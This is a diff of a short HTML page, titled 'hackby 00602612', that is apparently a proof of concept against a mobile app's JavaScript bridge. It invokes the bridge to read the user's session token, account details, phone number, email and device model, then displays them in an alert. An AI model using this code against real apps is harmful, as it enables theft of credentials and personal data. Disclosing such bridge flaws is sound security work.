@@ -1,13 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <script src="./ado.min.3.1.0.js?key=notice"></script>
-</head>
-<body>
- <script>
-var evaljson = JSON.stringify({"appId":"notice","methodName":"parameters","parameters":"token;tenant_code;tenant_name;language;user_id;user_account;user_name;user_mobile;user_email;user_sub_account;user_sub_account_list;mobile_model","callback":"window.innerado.callback.parametersCallback2"})
-window.innerado.callback.parametersCallback2=function(e){alert("hello 00602612 say：\r\n"+JSON.stringify(e));console.log(JSON.stringify(e))}
-window.adobridge.invoke(evaljson);
- </script>
-</body>
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>hackby 00602612</title>
+    </head>
+    
+    <body>
+        <script>
+        var evaljson = JSON.stringify({"appId":"notice","methodName":"parameters","parameters":"token;tenant_code;tenant_name;language;user_id;user_account;user_name;user_mobile;user_email;user_sub_account;user_sub_account_list;mobile_model","callback":"window.innerado.callback.parametersCallback2"})
+        window.innerado={"callback":{"parametersCallback2":function(e){alert(JSON.stringify(e));console.log(JSON.stringify(e))}}}
+        window.adobridge.invoke(evaljson);
+        </script>
+    </body>
 </html>
